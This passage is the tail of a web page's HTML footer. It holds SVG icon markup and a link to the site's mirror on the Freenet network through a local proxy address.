	<path fill="#323232" d="M221.459,396.62c-8.84,0-15.904-2.21-21.191-6.63c-5.289-4.42-8.449-10.441-9.488-18.07   c-4.855,5.895-10.66,10.965-17.42,15.21c-6.762,4.249-14.561,6.37-23.4,6.37c-6.59,0-12.83-1.256-18.72-3.77   c-5.895-2.512-11.095-6.15-15.6-10.92c-4.509-4.766-8.105-10.571-10.79-17.42c-2.689-6.846-4.03-14.69-4.03-23.531   c0-9.879,1.56-19.064,4.68-27.56c3.12-8.49,7.365-15.86,12.74-22.1c5.371-6.24,11.7-11.136,18.98-14.69   c7.28-3.551,15.08-5.33,23.4-5.33c9.01,0,16.68,1.82,23.01,5.461c6.324,3.639,11.311,8.234,14.949,13.779l2.34-17.42h20.541   l-10.66,85.02c-0.52,3.99-0.781,7.021-0.781,9.101c0,5.029,1.041,8.929,3.121,11.7c2.08,2.774,5.545,4.16,10.4,4.16   c4.504,0,8.84-1.646,13-4.94c4.16-3.29,7.799-7.931,10.92-13.91c3.119-5.979,5.589-13.085,7.41-21.319   c1.82-8.23,2.729-17.291,2.729-27.17c0-11.961-2.123-23.051-6.369-33.281c-4.25-10.225-10.228-19.064-17.939-26.52   c-7.715-7.451-16.859-13.26-27.43-17.42c-10.576-4.16-22.189-6.24-34.842-6.24c-16.119,0-30.464,3.165-43.029,9.49   c-12.57,6.33-23.14,14.605-31.72,24.83c-8.58,10.229-15.08,21.799-19.5,34.71c-4.42,12.915-6.63,26.045-6.63,39.39   c0,15.08,2.34,28.516,7.02,40.301c4.68,11.789,11.18,21.795,19.5,30.029c8.32,8.23,18.11,14.471,29.38,18.721   c11.265,4.244,23.485,6.369,36.661,6.369c13.17,0,24.914-1.561,35.229-4.68c10.311-3.121,20.15-6.936,29.512-11.439l7.539,19.76   c-9.016,4.85-19.891,8.924-32.631,12.219c-12.738,3.291-26.479,4.941-41.209,4.941c-16.64,0-31.98-2.516-46.02-7.541   c-14.04-5.029-26.175-12.439-36.4-22.23c-10.229-9.795-18.2-21.84-23.92-36.139c-5.72-14.301-8.58-30.811-8.58-49.53   c0-17.331,2.99-33.841,8.97-49.53c5.98-15.686,14.471-29.51,25.48-41.47c11.005-11.96,24.266-21.45,39.78-28.47   c15.51-7.02,32.889-10.53,52.129-10.53c16.291,0,31.156,2.645,44.59,7.93c13.432,5.29,24.916,12.524,34.451,21.71   c9.529,9.189,16.898,20.064,22.1,32.63c5.199,12.568,7.799,26.129,7.799,40.689c0,12.48-1.518,23.965-4.549,34.45   c-3.035,10.489-7.195,19.5-12.48,27.04c-5.289,7.54-11.615,13.391-18.98,17.55C238.139,394.54,230.124,396.62,221.459,396.62z    M156.979,374.26c6.76,0,13-1.86,18.721-5.59c5.719-3.725,10.311-7.756,13.779-12.09l6.24-51.48   c-3.469-5.545-7.975-10.051-13.52-13.52c-5.551-3.465-11.875-5.2-18.98-5.2c-5.201,0-10.23,1.17-15.08,3.511   c-4.855,2.34-9.145,5.635-12.87,9.879c-3.729,4.25-6.675,9.32-8.84,15.211c-2.169,5.895-3.25,12.395-3.25,19.5   c0,13.174,3.291,23.1,9.88,29.77C139.645,370.925,147.62,374.26,156.979,374.26z"/>
</g>
</svg></span></a>

          </li>
          

          
          <li>
            <a href="http://127.0.0.1:8888/USK@ABR8mm2t1L1G8cBG70cDy4PHFO6LPV~LrA-RIZxgOGI,pnGWUxb7k8~5-ywwqnBakTXx5ZFw6QzzZj7H~45NgE8,AQACAAE/binholic/-1/"><span class="icon icon--freenet"><?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!-- Created with Inkscape (http://www.inkscape.org/) -->
<svg
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   version="1.0"
   width="79.12"
   height="52.64">
  <defs/>
  <g
     transform="translate(-47.495719,-111.30691)">
    <path
       d="M 80.03,122.66 C 94.49,107.06 104.32,113.99 87.53,124.89 C 82.19,128.36 83.58,129.37 87.17,128.82 C 92.24,128.05 95.01,129.02 96.24,129.98 C 99.18,132.28 100.65,130.57 101.64,128.82 C 103.61,125.35 110.25,129.12 105.39,132.75 C 101.59,135.58 102.12,138.77 105.57,140.61 C 111.96,144.01 126.30,150.75 124.14,157.93 C 123.26,160.86 121.67,163.62 118.07,159.89 C 111.32,152.92 106.83,146.97 91.28,144.54 C 81.24,142.96 71.15,140.33 61.46,145.25 C 56.90,147.67 51.16,149.23 49.94,146.37 C 48.35,142.64 56.47,139.57 64.32,138.82 C 69.42,138.33 73.99,134.99 67.00,133.29 C 58.39,130.64 68.28,123.09 74.50,124.89 C 78.55,126.07 78.95,123.83 80.03,122.66 z"
       style="fill:#ffffff;stroke:#356ace;stroke-width:1.5;" />
  </g>
</svg>
</span></a>

          </li>
          
        </ul>
      </div>

    </div>

  </div>

</footer>


  </body>

</html>
